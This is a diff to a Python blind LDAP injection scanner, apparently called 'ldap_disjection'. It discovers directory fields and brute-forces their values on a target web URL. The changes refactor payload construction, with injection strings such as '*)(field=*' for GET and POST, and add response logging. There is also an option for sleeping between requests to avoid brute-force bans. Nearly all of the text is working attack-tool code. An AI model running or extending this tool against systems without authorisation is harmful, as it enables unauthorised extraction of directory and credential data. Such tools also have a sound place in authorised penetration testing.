@@ -157,7 +157,11 @@ class WebLdapScanner:
 
             if field != prm_start:
                 if req_type == "GET":
-                    payload = f"{url_base}*)({field}=*"
+                    payload = WebLdapScanner.get_payload(
+                        url=url_base,
+                        prm_start=prm_start,
+                        field=field
+                    )
                     text, status_code = self.send_request(payload)
                 else:
                     payload = {prm_start:'*)('+field+'=*'}
@@ -178,7 +182,8 @@ class WebLdapScanner:
                         text=text,
                         is_cond=is_cond,
                         is_neg_cond=is_neg_cond,
-                        is_valid_field=is_valid_field
+                        is_valid_field=is_valid_field,
+                        is_verbose=isinstance(self.prms.get('res_reg'), re.Pattern)
                     )
 
                 if is_valid_field:
@@ -235,7 +240,7 @@ class WebLdapScanner:
 
                 WebLdapScanner.print_brute_field_value(
                     payload=payload,
-                    flag=flag,
+                    flag=flag+quoted,
                     status_code=status_code,
                     text=text,
                     is_cond=is_cond,
@@ -255,7 +260,7 @@ class WebLdapScanner:
             i += 1
             
             if test_spe_char is True and has_found_char is False:
-                logger.info(f"[*] Next char not found, test with '*'. Flag status : {flag}")
+                logger.warning(f"[*] Next char not found, test with char '*'. Flag status : {flag}")
                 char_add = "*"
                 test_spe_char = False
             elif test_spe_char is False and has_found_char is False:
@@ -323,17 +328,32 @@ class WebLdapScanner:
     ]
 
     @staticmethod
-    def get_base_url(url, prm_start, value_start):
-        url_base = f"{url}?{prm_start}"
-        if isinstance(value_start, str):
-            url_base += f"={value_start}"
-        else:
-            url_base += f"="
+    def get_base_url(url:str,
+                     prm_start:str|None,
+                     value_start:str|None) -> string:
+        url_base = f"{url}?"
+
+        if Ut.is_str(prm_start):
+            url_base += f"{prm_start}"
+
+            if Ut.is_str(value_start):
+                url_base += f"={value_start}"
+            else:
+                url_base += f"="
 
         return url_base
 
     @staticmethod
-    def get_base_post_data(url, prm_start, value_start):
+    def get_payload(url, prm_start, field):
+        payload = f"{url}?"
+        if Ut.is_str(prm_start):
+            payload += f"*)({field}=*"
+        else:
+            payload += f"{field}=*"
+        return payload
+    
+    @staticmethod
+    def get_post_payload(url, prm_start, value_start):
         return None
 
 
@@ -344,23 +364,26 @@ class WebLdapScanner:
                             text: str,
                             is_cond: bool,
                             is_neg_cond: bool,
-                            is_valid_field: bool):
+                            is_valid_field: bool,
+                            is_verbose:bool = False):
         if is_valid_field:
             logger.info(f"[*] --------------------")
             logger.info(f"[*] Payload : {payload}")
             logger.info(f"Field: {field}")
             logger.info(f"Content Length: {len(text)}")
+            if is_verbose is True:
+                logger.info(f"[*] Response text : {text}")
         else:
             logger.debug(f"[*] --------------------")
             logger.debug(f"[*] Payload : {payload}")
             logger.debug(f"Field: {field}")
             logger.debug(f"Content Length: {len(text)}")
+            logger.debug(f"[*] Response text : {text}")
+
         logger.debug(f"[*] Request status code : {status_code}")
         logger.debug(f"[*] Is cond active and in Response text : {is_cond}")
         logger.debug(f"[*] Is neg_cond active and not in Response text : {is_neg_cond}")
         logger.debug(f"[*] Is Valid Field : {is_valid_field}")
-        logger.debug(f"Content Length: {len(text)}")
-        logger.debug(f"[*] Response text : {text}")
         logger.debug(f"[*] --------------------")
     
     @staticmethod
@@ -473,20 +496,19 @@ def parse_args():
     # create arguments
     parser = argparse.ArgumentParser(description="Discover and blin LDAP fields")
     parser.add_argument("-m", "--mode", 
-                        help="Specify the mode: discover | injection | brutforce", 
+                        help="Specify the mode", 
                         required=True, 
-                        choices=["discover", "injection", "brutforce"])
+                        choices=["discover", "brutforce"])
     parser.add_argument("-u", "--url", 
                         help="Specify the target URL", 
                         required=True)
 
     parser.add_argument("-ps", "--prm_start", 
-                        help="Specify the starting GET or POST parameter", 
-                        required=True)
+                        help="Specify the first valid field name")
     parser.add_argument("-pv", "--value_start", 
-                        help="Specify the starting parameter")
+                        help="Specify the value of the first field")
     parser.add_argument("-pb", "--brute_prm", 
-                        help="Specify the parameter to brute force")
+                        help="Specify the field name to brute force")
 
     parser.add_argument("-c", "--cond", 
                         help="Specify the text who must be present on result for success")
@@ -499,19 +521,19 @@ def parse_args():
                         help="Sleep value between requests to Avoid brute-force bans default to 0.2s")
 
     parser.add_argument("-G", "--get", 
-                        help="Specify GET request type", 
+                        help="Select a GET request type", 
                         action="store_true" )
     parser.add_argument("-P", "--post", 
-                        help="Specify POST request type", 
+                        help="Select a POST request type", 
                         action="store_true" )
     parser.add_argument("-r", "--res_reg", 
-                        help="Specify the regex to apply to result" )
+                        help="Specify the regex to apply to result for display" )
     parser.add_argument("-ll", "--log_level", 
                         help="Specify the log verbosity level", 
                         choices=range(1, 5),
                         type=int,
                         default=2)
-    parser.add_argument("-d", "--debug", help="Specify if debug is activated", action="store_true" )
+    parser.add_argument("-d", "--debug", help="Specify if debug mode is activated", action="store_true" )
     parser.add_argument('-v', '--version', action='version',
                         version=f'ldap_disjection {__version__}')
 
